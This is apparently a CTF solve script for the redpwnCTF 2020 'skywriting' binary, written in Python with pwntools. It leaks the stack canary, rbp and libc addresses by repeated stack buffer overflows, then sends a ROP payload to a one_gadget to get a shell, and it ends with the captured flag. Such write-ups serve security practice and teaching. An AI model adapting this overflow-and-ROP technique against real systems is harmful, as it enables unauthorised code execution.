#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

"""
Strategy:

We have a stack buffer overflow via read(stdin, stack_buf, 512) over a 144 byte buffer.
The program loops infinitely until "notflag{a_cloud_is_just_someone_elses_computer}\n"
is at the front of the input. So, we systematically buffer overflow to leak everything
we need before triggering the ret.

We leak rbp, stack canary, .text addr, and a libc address.
Then we overflow with the 'notflag' at the beginning of our input and ROP to one_gadget
"""

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './bin/skywriting'


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("2020.redpwnc.tf", 31034)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()
io.recvuntil(b"write on the sky?")
io.sendline(b"1")
io.recvuntil(b"best shot: ")

# 128
# leak rbp
io.sendline(b"i"*127)
response = io.recvuntil(b"shot: ")
rbp = u64(response.split(b"\n")[1][0:6].ljust(8, b"\x00"))
log.info(f"rbp = {hex(rbp)}")

# 128 + 8 
# leak stack canary
io.sendline(b"i"*(128+8))
response = io.recvuntil(b"shot: ")
canary = u64(response.split(b"\n")[1][0:7].rjust(8, b"\x00"))
log.info(f"canary = {hex(canary)}")

# 128 + 8 + 8
# leak init (text section addr)
init_addr = u64(response.split(b"\n")[1][7:13].ljust(8, b"\x00"))
log.info(f"init addr = {hex(init_addr)}")

# 128 + 8 + 8 + 8
# leak __libc_start_main+80 (libc address)
io.sendline(b"i"*(128+8+8+8))
response = io.recvuntil(b"shot: ")
libc_addr = u64(response.split(b"\n")[1][0:5].rjust(6, b"\x00").ljust(8, b"\x00"))
log.info(f"libc_start_main+80 = {hex(libc_addr)}")

libc_base = libc_addr - 0x21b00
one_gadget = libc_base + 324386 # rsp + 0x30 needs to be NULL
log.info(f"one_gadget = {hex(one_gadget)}")

# end of leaks, trigger the stack buffer overflow
notflag = b"notflag{a_cloud_is_just_someone_elses_computer}\n\x00"

payload = notflag
payload += b"\x00"*(128 - len(notflag))
payload += p64(rbp)
payload += p64(canary)
payload += p64(one_gadget)
payload += p64(one_gadget) # ret

padding = b"\x00"*(512 - len(payload))
payload += padding
io.sendline(payload)

io.interactive()

# flag{a_cLOud_iS_jUSt_sOmeBodY_eLSes_cOMpUteR}

